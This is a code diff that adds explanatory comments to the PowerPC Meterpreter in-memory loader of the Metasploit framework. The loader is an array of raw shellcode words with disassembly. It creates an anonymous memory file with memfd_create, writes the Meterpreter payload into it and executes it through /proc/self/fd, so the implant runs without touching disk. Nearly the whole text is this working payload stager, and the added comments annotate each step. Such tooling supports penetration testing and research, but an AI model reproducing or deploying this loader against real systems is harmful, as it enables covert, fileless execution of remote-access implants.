@@ -8,15 +8,20 @@
 module Msf::Payload::Linux::Ppc::MeterpreterLoader
   def in_memory_load(payload)
     in_memory_loader = [
-
+      
+      #use branch and branch with link to get address of payload data
       0x48000084, # 0x1000:	b	0x1084	0x48000084
       0x7de802a6, # 0x1004:	mflr	r15	0x7de802a6
+      
+      #memfd_create(null, MFD_CLOEXEC)
       0x39c00000, # 0x1008:	li	r14, 0	0x39c00000
       0x95c10000, # 0x100c:	stwu	r14, 0(r1)	0x95c10000
       0x7c230b78, # 0x1010:	mr	r3, r1	0x7c230b78
       0x38800000, # 0x1014:	li	r4, 0	0x38800000
       0x38000168, # 0x1018:	li	r0, 0x168	0x38000168
       0x44000002, # 0x101c:	sc		0x44000002
+      
+      #write(fd, payload, payload_length);
       0x7df07b78, # 0x1020:	mr	r16, r15	0x7df07b78
       0x7c711b78, # 0x1024:	mr	r17, r3	0x7c711b78
       0x80af0000, # 0x1028:	lwz	r5, 0(r15)	0x80af0000
@@ -24,6 +29,8 @@ module Msf::Payload::Linux::Ppc::MeterpreterLoader
       0x7de47b78, # 0x1030:	mr	r4, r15	0x7de47b78
       0x38000004, # 0x1034:	li	r0, 4	0x38000004
       0x44000002, # 0x1038:	sc		0x44000002
+      
+      #convert fd into string using custom itoa and append it to /proc/self/fd/
       0x3a100020, # 0x103c:	addi	r16, r16, 0x20	0x3a100020
       0x3a40000a, # 0x1040:	li	r18, 0xa	0x3a40000a
       0x7e7193d6, # 0x1044:	divw	r19, r17, r18	0x7e7193d6
@@ -36,12 +43,15 @@ module Msf::Payload::Linux::Ppc::MeterpreterLoader
       0x22100001, # 0x1060:	subfic	r16, r16, 1	0x22100001
       0x2c110000, # 0x1064:	cmpwi	r17, 0	0x2c110000
       0x4082ffdc, # 0x1068:	bne	0x1044	0x4082ffdc
+      
       0x39efffe2, # 0x106c:	addi	r15, r15, -0x1e	0x39efffe2
+      #execve(/proc/self/fd/[fd], 0,0)
       0x7de37b78, # 0x1070:	mr	r3, r15	0x7de37b78
       0x7ca52a78, # 0x1074:	xor	r5, r5, r5	0x7ca52a78
       0x7c842278, # 0x1078:	xor	r4, r4, r4	0x7c842278
       0x3800000b, # 0x107c:	li	r0, 0xb	0x3800000b
       0x44000002, # 0x1080:	sc		0x44000002
+
       0x4bffff81, # 0x1084:	bl	0x1004	0x4bffff81
 
       payload.length
